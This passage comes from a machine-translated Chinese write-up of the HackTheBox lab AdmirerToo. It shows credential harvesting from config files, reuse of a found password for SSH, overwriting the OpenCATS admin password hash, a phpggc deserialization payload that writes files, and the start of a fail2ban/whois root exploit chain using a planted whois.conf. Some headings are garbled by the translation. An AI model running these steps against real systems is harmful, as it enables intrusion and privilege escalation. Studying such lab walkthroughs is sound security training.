lv lw na ly lz ma nb mc md me ij bi translated">环顾四周，我在/opt文件夹中发现了一些有趣的东西:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="0559" class="nn kg iq nj b gy no np l nq nr">opentsdb@admirertoo:~$ ls -l /opt<br/>drwxr-xr-x  9 root hbase 4096 Jul  8  2021 hbase<br/>drwxr-xr-x 23 root root  4096 Jul 21  2021 opencats</span></pre><p id="ae13" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">在那个文件夹中，自述文件将我们指向这里的文档<a class="ae nu" href="https://opencats-documentation.readthedocs.io/en/latest/introduction.html" rel="noopener ugc nofollow" target="_blank"/>。这似乎是一个免费的招聘系统，我在文件夹中找到了一个配置文件，其中包含数据库凭据:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="2a1d" class="nn kg iq nj b gy no np l nq nr">opentsdb@admirertoo:/opt/opencats$ more config.php<br/>&lt;?php<br/>/*<br/> * CATS<br/> * Configuration File<br/> *<br/>&lt;SNIP&gt;<br/>/* Database configuration. */<br/>define('DATABASE_USER', 'cats');<br/>define('DATABASE_PASS', 'adm1r3r0fc4ts');<br/>define('DATABASE_HOST', 'localhost');<br/>define('DATABASE_NAME', 'cats_dev');</span></pre><h1 id="e07c" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">MySQL枚举</h1><p id="a3ad" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">我们可以找到数据库:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="819e" class="nn kg iq nj b gy no np l nq nr">opentsdb@admirertoo:/opt/opencats$ find / -name cats_dev 2&gt;/dev/null<br/>/var/lib/mysql/cats_dev</span></pre><p id="e224" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">有了凭证，我们可以枚举数据库和转储用户:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="01ff" class="nn kg iq nj b gy no np l nq nr">opentsdb@admirertoo:/opt/opencats$ mysql -u cats -padm1r3r0fc4ts -e 'show databases;'<br/>+--------------------+<br/>| Database           |<br/>+--------------------+<br/>| cats_dev           |<br/>| information_schema |<br/>+--------------------+</span><span id="49ea" class="nn kg iq nj b gy nv np l nq nr">opentsdb@admirertoo:/opt/opencats$ mysql -u cats -padm1r3r0fc4ts -e 'show tables from cats_dev;'<br/>+--------------------------------------+<br/>| Tables_in_cats_dev                   |<br/>+--------------------------------------+<br/>| access_level                         |<br/>&lt;SNIP&gt;<br/>| user                                 |<br/>| user_login                           |<br/>| word_verification                    |<br/>| xml_feed_submits                     |<br/>| xml_feeds                            |<br/>| zipcodes                             |<br/>+--------------------------------------+</span><span id="d761" class="nn kg iq nj b gy nv np l nq nr">opentsdb@admirertoo:/opt/opencats$ mysql -u cats -padm1r3r0fc4ts -e 'show columns in user from cats_dev;'<br/>+---------------------------+--------------+------+-----+---------+<br/>| Field                     | Type         | Null | Key | Default |<br/>+---------------------------+--------------+------+-----+---------+<br/>| user_id                   | int(11)      | NO   | PRI | NULL    |<br/>| site_id                   | int(11)      | NO   | MUL | 0       |<br/>| user_name                 | varchar(64)  | NO   |     |         |<br/>| email                     | varchar(128) | YES  |     | NULL    |<br/>| password                  | varchar(128) | NO   |     |         |<br/>&lt;SNIP&gt;<br/>| can_see_eeo_info          | int(1)       | YES  |     | 0       |<br/>+---------------------------+--------------+------+-----+---------+</span><span id="40f5" class="nn kg iq nj b gy nv np l nq nr">opentsdb@admirertoo:/opt/opencats$ mysql -u cats -padm1r3r0fc4ts -D cats_dev -e 'select user_name,password from user;'<br/>+----------------+----------------------------------+<br/>| user_name      | password                         |<br/>+----------------+----------------------------------+<br/>| admin          | dfa2a420a4e48de6fe481c90e295fe97 |<br/>| cats@rootadmin | cantlogin                        |<br/>| jennifer       | f59f297aa82171cc860d76c390ce7f3e |<br/>+----------------+----------------------------------+</span></pre><p id="7028" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">我无法破解这些md5哈希，所以现在这是一个死胡同。是时候对操作系统进行更多的枚举了，我最终找到了更多的凭证:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="013d" class="nn kg iq nj b gy no np l nq nr">opentsdb@admirertoo:/var/www/adminer$ grep -rl "pass*" . 2&gt;/dev/null<br/>./plugins/data/servers.php<br/>./plugins/oneclick-login.php<br/>./plugins/plugin.php<br/>./adminer-included-0ae90598f37b20e3e7eb122c427729ed.php<br/><br/>opentsdb@admirertoo:/var/www/adminer$ cat plugins/data/servers.php<br/>&lt;?php<br/>return [<br/>  'localhost' =&gt; array(<br/>//    'username' =&gt; 'admirer',<br/>//    'pass'     =&gt; 'bQ3u7^AxzcB7qAsxE3',<br/>// Read-only account for testing<br/>    'username' =&gt; 'admirer_ro',<br/>    'pass'     =&gt; '1w4nn4b3adm1r3d2!',<br/>    'label'    =&gt; 'MySQL',<br/>    'databases' =&gt; array(<br/>      'admirer' =&gt; 'Admirer DB',<br/>    )<br/>  ),<br/>];</span></pre><p id="ed5c" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">看看可以登录机器的用户，我们只看到一个:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="378e" class="nn kg iq nj b gy no np l nq nr">opentsdb@admirertoo:/var/www/adminer$ ls -l /home<br/>drwxr-xr-x 3 jennifer users 4096 Feb 22 20:58 jennifer</span></pre><h1 id="b972" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">宋承宪饰演詹妮弗</h1><p id="fa55" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">原来上面的密码被jennifer重复使用了:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="a873" class="nn kg iq nj b gy no np l nq nr">┌──(root💀kali)-[~/htb/admirertoo]<br/>└─# ssh jennifer@admirer-gallery.htb<br/>jennifer@admirer-gallery.htbs password:<br/>Linux admirertoo 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1<br/>No mail.<br/>Last login: Wed Mar  2 22:02:08 2022 from 10.10.14.160<br/>jennifer@admirertoo:~$</span></pre><p id="573d" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">查看正在运行的服务，可以看到一些端口在本地侦听:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi od"><img src="../Images/112b15f7506fca38bc56826312a9a913.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qBawQbrwiU5u3p_hbP2p3w.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">netstat显示本地监听服务</figcaption></figure><p id="9362" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">8080端口经常用于网站，我们可以使用curl来查看:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="8e7c" class="nn kg iq nj b gy no np l nq nr">jennifer@admirertoo:~$ curl 127.0.0.1:8080<br/>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"<br/>"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;<br/>&lt;html&gt;<br/>&lt;head&gt;<br/>&lt;title&gt;opencats - Login&lt;/title&gt;</span></pre><h1 id="365d" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">SSH端口转发</h1><p id="9289" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">这是我们之前看到的OpenCats的登录页面。让我们建立一个从Kali到box的SSH隧道，这样我们就可以查看该网站:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="cc33" class="nn kg iq nj b gy no np l nq nr">┌──(root💀kali)-[~/htb/admirertoo]<br/>└─# ssh -L 1234:127.0.0.1:8080 jennifer@admirer-gallery.htb<br/>jennifer@admirer-gallery.htb's password:<br/>Linux admirertoo 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1<br/>Last login: Wed Mar  2 23:07:19 2022 from 10.10.14.169<br/>jennifer@admirertoo:~$</span></pre><p id="909a" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">现在，在Kali上，我们可以浏览到端口1234，并将通过SSH隧道转发到机器上的端口8080:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi oe"><img src="../Images/30d928fd440a36dea80afb0a0cb4d3a5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1144/format:webp/0*x_dwXfo6iuePSjZc.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">OpenCats登录页面</figcaption></figure><h1 id="4ac1" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">OpenCats漏洞</h1><p id="4a0d" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">登录页面显示版本是0.9.5.2，搜索发现两个CVE。<a class="ae nu" href="https://www.opencve.io/cve/CVE-2021-25294" rel="noopener ugc nofollow" target="_blank">这个</a>是反序列化漏洞利用，<a class="ae nu" href="https://www.opencve.io/cve/CVE-2021-25295" rel="noopener ugc nofollow" target="_blank">这个</a>是XXS问题。两者都指向这里的<a class="ae nu" href="https://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html" rel="noopener ugc nofollow" target="_blank">技术走位。</a></p><p id="561e" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">为了能够利用这些漏洞，我们需要有效的凭证来进入OpenCATS仪表板。早些时候我从OpenCATS使用的MySQL数据库中找到了用户和哈希，但我无法破解它们。相反，对于数据库的管理员访问权限，我们可以为管理员帐户设置一个新密码。</p><p id="c0f0" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">为我的密码创建一个md5散列，它是pencer:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="4830" class="nn kg iq nj b gy no np l nq nr">jennifer@admirertoo:~$ echo -n pencer | md5sum<br/>b8ea4ab13b0e0864760dbfb9427f31fc  -</span></pre><p id="5795" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">在数据库中找到管理员帐户的user_id:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="f388" class="nn kg iq nj b gy no np l nq nr">jennifer@admirertoo:~$ mysql -u cats -padm1r3r0fc4ts -D cats_dev -e 'select user_id,user_name,password from user;'<br/>+---------+----------------+----------------------------------+<br/>| user_id | user_name      | password                         |<br/>+---------+----------------+----------------------------------+<br/>|       1 | admin          | dfa2a420a4e48de6fe481c90e295fe97 |<br/>|    1250 | cats@rootadmin | cantlogin                        |<br/>|    1251 | jennifer       | f59f297aa82171cc860d76c390ce7f3e |<br/>+---------+----------------+----------------------------------+</span></pre><p id="6f7c" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">将密码更改为我的哈希版本:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="4934" class="nn kg iq nj b gy no np l nq nr">jennifer@admirertoo:~$ mysql -u cats -padm1r3r0fc4ts -D cats_dev -e 'update user set password = "b8ea4ab13b0e0864760dbfb9427f31fc" where user_id = 1;'</span></pre><h1 id="46c5" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">OpenCats作为管理员</h1><p id="981a" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">现在回到OpenCATS登录框，使用admin:pencer进入仪表板:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi of"><img src="../Images/e9f537888bbe82931dcd47c77bbddaf5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*xiJ4r6dvB349xirf.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">以管理员身份登录OpenCats主页</figcaption></figure><p id="8446" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">该漏洞说明activities部分使用了不安全的反序列化函数。开始打嗝，准备好拦截，然后点击日期:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi og"><img src="../Images/fd2b5345c263671146a362e0a1a96543.png" data-original-src="https://miro.medium.com/v2/resize:fit:1250/format:webp/0*PhlVq50A1PqosFOR.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">用打嗝拦截OpenCats请求</figcaption></figure><p id="e080" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">在Burp中，您可以看到ActivityDataGrid参数后面有一个序列化的字符串:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi oh"><img src="../Images/710804d13953b6829785e9c4cb9c4602.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*4PdBgnQ3DGSXO3Tq.png"/></div></div></figure><h1 id="cd50" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">phpggc</h1><p id="683e" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">我们可以为我们自己的代码改变这一点，并在盒子上放一个文件。按照说明使用<a class="ae nu" href="https://github.com/ambionics/phpggc" rel="noopener ugc nofollow" target="_blank"> phpggc </a>:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="64ab" class="nn kg iq nj b gy no np l nq nr">┌──(root💀kali)-[~/htb/admirertoo]<br/>└─# phpggc             <br/>Command 'phpggc' not found, but can be installed with:<br/>apt install phpggc<br/>Do you want to install it? (N/y)y<br/>apt install phpggc<br/>Reading package lists... Done<br/>Building dependency tree... Done<br/>Reading state information... Done<br/>The following NEW packages will be installed:<br/>  phpggc<br/>0 upgraded, 1 newly installed, 0 to remove and 587 not upgraded.<br/>Need to get 40.1 kB of archives.<br/>After this operation, 423 kB of additional disk space will be used.<br/>Get:1 https://archive-4.kali.org/kali kali-rolling/main amd64 phpggc all 0.20210218-0kali1 [40.1 kB]<br/>Fetched 40.1 kB in 1s (40.6 kB/s) <br/>Selecting previously unselected package phpggc.<br/>(Reading database ... 305301 files and directories currently installed.)<br/>Preparing to unpack .../phpggc_0.20210218-0kali1_all.deb ...<br/>Unpacking phpggc (0.20210218-0kali1) ...<br/>Setting up phpggc (0.20210218-0kali1) ...<br/>Processing triggers for kali-menu (2021.4.2) ...</span></pre><p id="0393" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">如果需要，安装。现在创建我们的测试文件并使用phpggc给我们一个序列化的对象:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="b78f" class="nn kg iq nj b gy no np l nq nr">┌──(root💀kali)-[~/htb/admirertoo]<br/>└─# echo "this is a test" &gt; pencer.txt<br/><br/>┌──(root💀kali)-[~/htb/admirertoo]<br/>└─# phpggc -u --fast-destruct Guzzle/FW1 /dev/shm/pencer.txt /root/htb/admirertoo/pencer.txt <br/>a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A41%3A%22%00GuzzleHttp%5CCookieJar%00filename%22%3Bs%3A17%3A%22%2Fdev%2Fshm%2Fpencer.txt%2&lt;SNIP&gt;%3B%7D</span></pre><h1 id="5b27" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">文件丢弃</h1><p id="5219" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">现在粘贴到打嗝，并替换已经存在的:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi oi"><img src="../Images/e3d77c7d2064d596d816075c5e92f1ec.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*URVY1zEpcFNPP97H.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">将有效负载粘贴到打嗝</figcaption></figure><p id="76ab" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">使用中继器发送请求，我们看到一个200 OK响应。切换到机器上的SSH会话，检查我们刚才放在那里的文件:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="997d" class="nn kg iq nj b gy no np l nq nr">jennifer@admirertoo:~$ ls -l /dev/shm/<br/>4 -rw-r--r--  1 devel devel   58 Mar  3 21:46 pencer.txt</span><span id="21ab" class="nn kg iq nj b gy nv np l nq nr">jennifer@admirertoo:~$ cat /dev/shm/pencer.txt <br/>[{"Expires":1,"Discard":false,"Value":"this is a test\n"}]</span></pre><p id="8bd8" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">该文件属于另一个名为devel的用户。我们可以查找用户有权访问的位置:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="bf8c" class="nn kg iq nj b gy no np l nq nr">jennifer@admirertoo:~$ find / -group devel 2&gt;/dev/null<br/>/dev/shm/test.txt<br/>/opt/opencats/INSTALL_BLOCK<br/>/usr/local/src<br/>/usr/local/etc</span></pre><h1 id="68d9" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">失败2班</h1><p id="6e0c" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">现在我们需要找到一种方法，利用devel用户的身份将我们选择的文件放在其中一个位置。下一部分花了我太长时间才弄明白！</p><p id="47f9" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">环顾四周，我注意到安装了fail2ban:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="f83f" class="nn kg iq nj b gy no np l nq nr">jennifer@admirertoo:~$ ls -l /etc/fail2ban/<br/>drwxr-xr-x 2 root root  4096 Jul 19  2021 action.d<br/>-rw-r--r-- 1 root root  2334 Jan 18  2018 fail2ban.conf<br/>drwxr-xr-x 2 root root  4096 Sep 23  2018 fail2ban.d<br/>drwxr-xr-x 3 root root  4096 Jul 19  2021 filter.d<br/>-rw-r--r-- 1 root root 22897 Jan 18  2018 jail.conf<br/>drwxr-xr-x 2 root root  4096 Jul 19  2021 jail.d<br/>-rw-r--r-- 1 root root   167 Jul 19  2021 jail.local<br/>-rw-r--r-- 1 root root   645 Jan 18  2018 paths-arch.conf<br/>-rw-r--r-- 1 root root  2827 Jan 18  2018 paths-common.conf<br/>-rw-r--r-- 1 root root   573 Jan 18  2018 paths-debian.conf<br/>-rw-r--r-- 1 root root   738 Jan 18  2018 paths-opensuse.conf</span></pre><p id="226a" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">检查我们可以看到它正在运行:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="e89d" class="nn kg iq nj b gy no np l nq nr">jennifer@admirertoo:~$ systemctl status fail2ban.service <br/>● fail2ban.service - Fail2Ban Service<br/>   Loaded: loaded (/lib/systemd/system/fail2ban.service; enabled; vendor preset: enabled)<br/>   Active: active (running) since Thu 2022-03-03 21:29:26 GMT;<br/>     Docs: man:fail2ban(1)<br/>  Process: 445 ExecStartPre=/bin/mkdir -p /var/run/fail2ban (code=exited, status=0/SUCCESS)<br/> Main PID: 459<br/>    Tasks: 3 (limit: 4701)<br/>   Memory: 22.6M<br/>   CGroup: /system.slice/fail2ban.service<br/>           └─459 /usr/bin/python3 /usr/bin/fail2ban-server -xf start</span></pre><p id="f02e" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">查看配置，我们可以看到它在保护ssh，并设置为在收到警报时发送电子邮件:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="0b32" class="nn kg iq nj b gy no np l nq nr">jennifer@admirertoo:~$ cat /etc/fail2ban/jail.d/defaults-debian.conf<br/>[sshd]<br/>enabled = true</span><span id="2247" class="nn kg iq nj b gy nv np l nq nr">jennifer@admirertoo:~$ cat /etc/fail2ban/jail.local<br/>[DEFAULT]<br/>ignoreip = 127.0.0.1<br/>bantime = 60s<br/>destemail = root@admirertoo.htb<br/>sender = fail2ban@admirertoo.htb<br/>sendername = Fail2ban<br/>mta = mail<br/>action = %(action_mwl)s</span></pre><p id="ed7f" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">检查安装的版本，我们发现它是旧的:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="2753" class="nn kg iq nj b gy no np l nq nr">jennifer@admirertoo:~$ fail2ban-server --version<br/>Fail2Ban v0.10.2</span></pre><p id="898b" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated"><a class="ae nu" href="https://github.com/fail2ban/fail2ban/releases#:~:text=a454884-,0.10.,burns%2Dlike%2Dthe%2Dcold" rel="noopener ugc nofollow" target="_blank">2018年发布0.10.2版本</a>。一个搜索找到<a class="ae nu" href="https://nvd.nist.gov/vuln/detail/CVE-2021-32749" rel="noopener ugc nofollow" target="_blank">CVE-2021–32749</a>为它。一点阅读发现<a class="ae nu" href="https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2021-32749" rel="noopener ugc nofollow" target="_blank">这个</a>导致<a class="ae nu" href="https://research.securitum.com/fail2ban-remote-code-execution/" rel="noopener ugc nofollow" target="_blank">这个</a>研究和这个<a class="ae nu" href="https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm" rel="noopener ugc nofollow" target="_blank">咨询</a>。</p><p id="fceb" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">从所有阅读中得到的关键信息是这一点:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="feae" class="nn kg iq nj b gy no np l nq nr">The ‘~|’ escape pipes the message composed so far through the given shell command and replaces the message with the output the command produced. If the command produced no output, mail assumes that something went wrong and retains the old contents of your message.</span></pre><p id="3495" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">有了它，我们可以在以root用户身份运行的Fail2Ban服务的上下文中，在机器上执行我们选择的代码。我们从配置文件中知道，要触发它，我们只需几次登录SSH失败。棘手的部分是我们如何将我们的转义序列注入到生成的邮件中，答案来自这里的咨询<a class="ae nu" href="https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm" rel="noopener ugc nofollow" target="_blank"/>:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="dd70" class="nn kg iq nj b gy no np l nq nr">This strictly puts whois command output of banned IP address into email. So if attacker could get control over whois output of his own IP address - code execution could be achieved (with root, which is more fun of course).</span></pre><h1 id="a1a1" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">Whois配置漏洞</h1><p id="9c86" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">这使我们回到这样一个事实，即我们可以通过OpenCATS的un-serialize漏洞将一个文件作为用户devel in /usr/local/etc删除。Whois使用配置文件列出公共whois服务器。这个版本的whois的文档说:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="d216" class="nn kg iq nj b gy no np l nq nr">The configuration file should reside in the /usr/local/etc directory, or the directory that you specified using the --sysconfdir switch to the configure script.</span></pre><p id="57f5" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">因此，我们创建了一个whois.conf文件，该文件指向我们的Kali IP，当它查找Fail2Ban将阻止的IP时，将使用该IP。为了实现这一点，我们必须在我们的conf文件中使用一个Regex表达式，这是因为phpggc对输入进行编码的方式。</p><p id="c0c9" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">例如，如果我们这样做:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="e625" class="nn kg iq nj b gy no np l nq nr">┌──(root💀kali)-[~/htb/admirertoo]<br/>└─# echo "[10.10.14.169]" &gt; whois.conf</span></pre><p id="495d" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">然后，在编码并放在盒子上之后，它将看起来像这样:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="7d0f" class="nn kg iq nj b gy no np l nq nr">jennifer@admirertoo:~$ cat/usr/local/etc/whois.conf<br/>[{"Expires":1,"Discard":false,"Value":"[10.10.14.169]\n"}]</span></pre><p id="d2ea" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">这是无效的，当你试图使用盒子上的whois时会出现错误。相反，我们像这样使用正则表达式:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="2e46" class="nn kg iq nj b gy no np l nq nr">┌──(root💀kali)-[~/htb/admirertoo]<br/>└─# echo "}]|. [10.10.14.169]" &gt; whois.conf</span></pre><p id="de74" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">当它放在盒子上时，看起来像这样:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="1925" class="nn kg iq nj b gy no np l nq nr">jennifer@admirertoo:~$ cat /usr/local/etc/whois.conf<br/>[{"Expires":1,"Discard":false,"Value":"}]|. [10.10.14.169]\n"}]</span></pre><p id="80ca" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">在正则表达式中，竖线是一个或，点是方括号内的匹配字符。这意味着尽管当whois解析conf文件时，它包含无效数据。导致它只使用括号内的字符。这是我们等待的Kali IP的有效IP地址。</p><p id="fb9d" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">让我们开始吧。首先创建我们的whois.conf文件:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="117e" class="nn kg iq nj b gy no np l nq nr">┌──(root💀kali)-[~/htb/admirertoo]<br/>└─# echo "}]|. [10.10.14.169]" &gt; whois.conf</span></pre><p id="eb67" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">使用phpgcc对其进行序列化，并将其放入机器上的/usr/local/etc文件夹中:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="37de" class="nn kg iq nj b gy no np l nq nr">┌──(root💀kali)-[~/htb/admirertoo]<br/>└─# phpggc -u --fast-destruct Guzzle/FW1 /usr/local/etc/whois.conf /root/htb/admirertoo/whois.conf<br/>a%3A2%3A%7Bi%3A7&lt;SNIP&gt;Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A20%3A%22%7D%5D%7C.+%5B10.10.14.169%5D%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3B%7Di%3A7%3Bi%3A7%3B%7D</span></pre><p id="008e" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">回到Burp，像以前一样捕获活动数据网格请求，用我们的内容替换开始时的序列化内容:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi oj"><img src="../Images/92a4251e9be5ebe671b45000aa716494.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*apGbM1T8iFCKMlGK.png"/></div></div><figcaption class="lf 